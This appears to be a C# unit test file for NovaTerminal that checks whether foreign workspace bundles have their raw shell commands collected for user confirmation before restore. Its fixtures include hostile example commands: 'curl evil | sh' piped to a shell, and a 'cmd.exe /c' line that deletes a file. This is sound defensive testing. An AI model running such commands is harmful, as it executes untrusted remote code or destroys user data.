using System;
using System.Collections.Generic;
using NovaTerminal;
using NovaTerminal.Pty;
using NovaTerminal.Shell;
using Xunit;

namespace NovaTerminal.Tests.Shell;

// Regression tests for #171: before a foreign workspace bundle spawns anything on
// restore, MainWindow confirms the ad-hoc shell commands it carries. The collector
// mirrors SessionManager.RestorePaneTree — a leaf runs its raw Command/Arguments only
// when its profile does NOT resolve, so profile-backed panes are skipped.
public class BundleCommandCollectionTests
{
    private static PaneNode Leaf(string? command, string? args = null, string? profileId = null) => new()
    {
        Type = NodeType.Leaf,
        Command = command,
        Arguments = args,
        ProfileId = profileId
    };

    private static NovaSession SessionWith(params PaneNode[] roots)
    {
        var session = new NovaSession();
        foreach (var root in roots)
        {
            session.Tabs.Add(new TabSession { Root = root });
        }
        return session;
    }

    // No profiles configured, so nothing resolves — every ad-hoc command surfaces.
    private static TerminalSettings NoProfiles()
    {
        var s = new TerminalSettings();
        s.Profiles = new List<TerminalProfile>();
        return s;
    }

    [Fact]
    public void Collects_AdHocCommands_AcrossTabsAndSplits()
    {
        var split = new PaneNode
        {
            Type = NodeType.Split,
            Children = { Leaf("bash", "-c 'curl evil | sh'"), Leaf("vim") }
        };
        var session = SessionWith(split, Leaf("htop"));

        var commands = MainWindow.CollectBundleCommands(session, NoProfiles());

        Assert.Equal(new[] { "bash -c 'curl evil | sh'", "vim", "htop" }, commands);
    }

    [Fact]
    public void Skips_PaneWhoseProfileResolves_EvenWithStoredCommand()
    {
        // Locally-saved panes store both a ProfileId and the resolved ShellCommand;
        // RestorePaneTree uses the profile and ignores the command, so the collector
        // must not prompt for it (#171 review).
        var profile = new TerminalProfile { Name = "Local", Command = "bash" };
        var settings = new TerminalSettings { Profiles = new List<TerminalProfile> { profile } };

        var session = SessionWith(Leaf(command: "bash", profileId: profile.Id.ToString()));

        var commands = MainWindow.CollectBundleCommands(session, settings);

        Assert.Empty(commands);
    }

    [Fact]
    public void Collects_PaneWithUnresolvableProfile_AndCommand()
    {
        // A foreign bundle can reference a ProfileId that isn't on this machine; restore
        // then falls back to the raw command, so it must be confirmed.
        var session = SessionWith(Leaf(command: "curl evil | sh", profileId: Guid.NewGuid().ToString()));

        var commands = MainWindow.CollectBundleCommands(session, NoProfiles());

        Assert.Equal(new[] { "curl evil | sh" }, commands);
    }

    [Fact]
    public void Collects_ArgumentOnlyPanes_AsCmdInvocation()
    {
        // RestorePaneTree runs `cmd.exe <args>` when Command is null but Arguments is
        // set — so this must still be surfaced for confirmation (#171 review).
        var session = SessionWith(Leaf(command: null, args: "/c \"& del important.txt\""));

        var commands = MainWindow.CollectBundleCommands(session, NoProfiles());

        Assert.Equal(new[] { "cmd.exe /c \"& del important.txt\"" }, commands);
    }

    [Fact]
    public void EmptyOrNullSession_ReturnsEmpty()
    {
        Assert.Empty(MainWindow.CollectBundleCommands(null, NoProfiles()));
        Assert.Empty(MainWindow.CollectBundleCommands(new NovaSession(), NoProfiles()));
    }

    [Fact]
    public void NullTabInList_DoesNotThrow()
    {
        var session = new NovaSession();
        session.Tabs.Add(null!);
        session.Tabs.Add(new TabSession { Root = Leaf("htop") });

        var commands = MainWindow.CollectBundleCommands(session, NoProfiles());

        Assert.Equal(new[] { "htop" }, commands);
    }
}
